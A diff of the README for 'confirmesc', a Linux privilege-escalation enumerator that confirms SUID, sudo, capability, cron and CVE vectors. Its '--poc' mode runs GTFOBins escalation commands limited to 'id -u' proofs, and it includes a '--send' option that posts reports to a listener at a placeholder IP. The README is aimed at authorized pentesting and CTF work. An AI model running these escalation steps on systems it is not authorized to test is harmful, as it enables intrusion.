@@ -1,7 +1,13 @@
+<p align="center">
+  <img src="assets/banner.png" alt="confirmesc - confirm what is actually exploitable, not just list it" width="760">
+</p>
+
 # confirmesc
 
+*powered by tmrswrr*
+
 A Linux privilege-escalation enumerator built around one idea: **don't just
-list suspicious things — confirm whether they're actually exploitable.**
+list suspicious things - confirm whether they're actually exploitable.**
 
 Tools like LinEnum and linpeas dump every SUID binary, every cron job, every
 kernel version on the box and leave it to you to figure out which of the 200
@@ -25,13 +31,23 @@ probe. This was verified end-to-end in the `testlab/` sandbox: both the
 generated SUID and sudo commands were run for real and produced
 `uid=0(root)`.
 
+## Demo
+
+An unprivileged user runs `confirmesc`, gets three `CONFIRMED` vectors each
+with a ready-to-run root shell, pastes one, and lands a root shell - recorded
+live in the `testlab/` Docker sandbox.
+
+<p align="center">
+  <img src="assets/demo.gif" alt="confirmesc demo: unprivileged user to root in the testlab sandbox" width="820">
+</p>
+
 ## Confidence levels
 
 | Level       | Meaning |
 |-------------|---------|
 | `CONFIRMED` | The exploitable condition itself was directly observed (a real writable root-cron file, a real SUID bit on a known GTFOBins binary, a real dangerous capability, an authorized `sudo -l` rule). Not a guess. |
-| `LIKELY`    | A strong indicator matched (typically a version string against a known-CVE range), but distro backports or extra runtime conditions could still block it — verify manually. |
-| `INFO`      | Context worth knowing, not itself an escalation path (e.g. an unclassified SUID binary not in the curated GTFOBins table — flagged for manual review, not asserted exploitable). |
+| `LIKELY`    | A strong indicator matched (typically a version string against a known-CVE range), but distro backports or extra runtime conditions could still block it - verify manually. |
+| `INFO`      | Context worth knowing, not itself an escalation path (e.g. an unclassified SUID binary not in the curated GTFOBins table - flagged for manual review, not asserted exploitable). |
 | `ERROR`     | The check itself could not complete (missing tool, permission denied). |
 
 ## What it checks
@@ -48,7 +64,7 @@ generated SUID and sudo commands were run for real and produced
 
 ## Three confirmation tiers: passive → active → PoC
 
-By default `confirmesc` is **fully passive** — it only reads file metadata,
+By default `confirmesc` is **fully passive** - it only reads file metadata,
 runs read-only commands (`find`, `getcap`, `sudo -n -l`, `uname -r`, ...),
 and never writes to disk or executes an exploit.
 
@@ -65,12 +81,12 @@ unrestricted `sudo ALL` rules), it **actually runs the real GTFOBins
 escalation payload** and checks whether the resulting process really has
 `euid == 0`. That flips a finding from "the conditions for exploitation are
 real" (CONFIRMED-by-condition) to "we actually got root, right now"
-(CONFIRMED-by-execution) — the strongest claim a privesc tool can make
+(CONFIRMED-by-execution) - the strongest claim a privesc tool can make
 without leaving state behind.
 
 Every `--poc` payload is deliberately a single read-only `id -u` proof
 (e.g. `find . -maxdepth 0 -exec /usr/bin/id -u ;`, `python3 -c "import os;
-os.system('id -u')"`, `bash -p -c "id -u"`) — no interactive shell is ever
+os.system('id -u')"`, `bash -p -c "id -u"`) - no interactive shell is ever
 spawned, no file is written, nothing persists. A failed attempt only ever
 prints an unprivileged uid instead of `0`; it does not downgrade the
 CONFIRMED-by-condition finding, it just notes the discrepancy so you know
@@ -78,7 +94,7 @@ live exploitation didn't line up with the GTFOBins reference on this box.
 
 Not every vector has a `--poc` recipe yet (editors/pagers like `vim`/`less`
 that need a TTY, and cron/systemd writable-file findings that would require
-waiting for a scheduler to fire, are intentionally left as condition-only —
+waiting for a scheduler to fire, are intentionally left as condition-only -
 see "Known limitations" below).
 
 **Only use `--poc` against systems you are explicitly authorized to test**
@@ -100,7 +116,7 @@ shell:" line in the text report, a green box in the HTML report, and the
 ## Install & run
 
 ```bash
-git clone <this repo>
+git clone https://github.com/capture0x/confirmesc
 cd confirmesc
 python3 -m pip install -e .
 confirmesc                       # passive scan, text report
@@ -110,6 +126,7 @@ confirmesc --format json -o out.json
 confirmesc --format html -o report.html   # shareable, collapsible HTML report
 confirmesc --category suid_sgid_sudo --min-confidence LIKELY
 confirmesc --quiet               # suppress the "[*] <check> done (Ns)" progress lines
+confirmesc --send http://<YOUR-IP>:8000   # also submit the report to a confirmesc-recv listener
 ```
 
 Checks run concurrently (thread pool, I/O-bound), so a full scan is typically
@@ -125,27 +142,49 @@ python3 -m confirmesc.cli
 Or as a single portable file to drop on a target (no pip install needed there):
 
 ```bash
-python3 -m zipapp confirmesc -m "confirmesc.cli:main" -o confirmesc.pyz -p "/usr/bin/env python3"
+# stage the package under its own name so it stays importable inside the archive,
+# then build the zipapp from that staging dir:
+mkdir -p build/pyz && cp -r confirmesc build/pyz/
+python3 -m zipapp build/pyz -m "confirmesc.cli:main" -o confirmesc.pyz -p "/usr/bin/env python3"
 # transfer confirmesc.pyz to the target, then:
 python3 confirmesc.pyz --no-color
 ```
 
 See `testlab/` for a local Docker-based vulnerable sandbox to see `--poc` actually gain root, without needing an external target like HTB.
 
-Exit code is `1` if any `CONFIRMED` finding exists, `0` otherwise — useful in CI/CTF automation.
+Exit code is `1` if any `CONFIRMED` finding exists, `0` otherwise - useful in CI/CTF automation.
+
+## Collecting the report on your own machine (`--send`)
+
+When reading the terminal on the target is inconvenient, run a small listener
+on your own box and have the scan submit its finished report back to it. The
+scan still runs locally on the target with the same tested check code; only
+the completed JSON report travels back, where it is re-rendered and saved with
+the target's own hostname and timing.
+
+```bash
+# on YOUR machine:
+confirmesc-recv --port 8000 --save-format html     # listens, prints and saves each report
+
+# on the target:
+confirmesc --send http://<YOUR-IP>:8000            # scans locally, then submits the report
+```
+
+`confirmesc-recv` options: `--host`/`--port` to bind, `--save-dir` for where to
+write received reports, and `--save-format text|json|html`.
 
 ## Known limitations
 
 - `--poc` only covers vectors with a curated non-interactive payload (see list above). Editor/pager GTFOBins entries (`vim`, `less`, `man`, ...) need a TTY and are condition-only for now.
-- Writable cron/systemd targets are confirmed by write-access, not by actually waiting for the scheduler to fire and observing root execution — that would require a real (if reversible) wait/trigger step and isn't implemented yet.
+- Writable cron/systemd targets are confirmed by write-access, not by actually waiting for the scheduler to fire and observing root execution - that would require a real (if reversible) wait/trigger step and isn't implemented yet.
 - Kernel/sudo/polkit CVE matches are version-string based (`LIKELY`); a distro can backport a fix without changing the version string, so always cross-check against your distro's advisory before relying on one. Fixed-version numbers for the less common CVEs are best-effort from public writeups and may be off by a point release on some branches.
 - `docker`/`lxd` group escalation and `sudo env_keep` findings are condition-only by design: proving them live would mean spinning up a real container or compiling and writing a shared object to disk, which breaks the "never writes to disk / never leaves running state" guarantee every other PoC in this tool holds to.
 - Cron wildcard injection detection uses a lightweight statement splitter, not a real shell parser - quoted `;`/`&&` inside strings, or wildcards built up across multiple variables, can be missed or (rarely) misattributed to the wrong working directory.
-- The GTFOBins and CVE tables are curated subsets, not a full scrape — extend them as you hit binaries/CVEs they don't cover yet.
+- The GTFOBins and CVE tables are curated subsets, not a full scrape - extend them as you hit binaries/CVEs they don't cover yet.
 
 ## Extending
 
-- Add binaries to `confirmesc/data/gtfobins.json` (`{"suid": bool, "sudo": bool, "capability": bool, "poc_args": [...], "cap_poc_args": [...]}`). `poc_args`/`cap_poc_args` are optional argv lists appended after the binary path — keep payloads read-only (print a uid, nothing else).
+- Add binaries to `confirmesc/data/gtfobins.json` (`{"suid": bool, "sudo": bool, "capability": bool, "poc_args": [...], "cap_poc_args": [...]}`). `poc_args`/`cap_poc_args` are optional argv lists appended after the binary path - keep payloads read-only (print a uid, nothing else).
 - Add CVEs to `confirmesc/data/cve_matrix.json` (`min_version`, optional `branch_fixes`, `default_fixed_at`).
 - Add a new check by subclassing `confirmesc.core.base.Check` and registering it in `confirmesc/checks/__init__.py`.
 
@@ -156,4 +195,4 @@ Exit code is `1` if any `CONFIRMED` finding exists, `0` otherwise — useful in 
 
 ## License
 
-MIT — see [LICENSE](LICENSE).
+MIT - see [LICENSE](LICENSE).
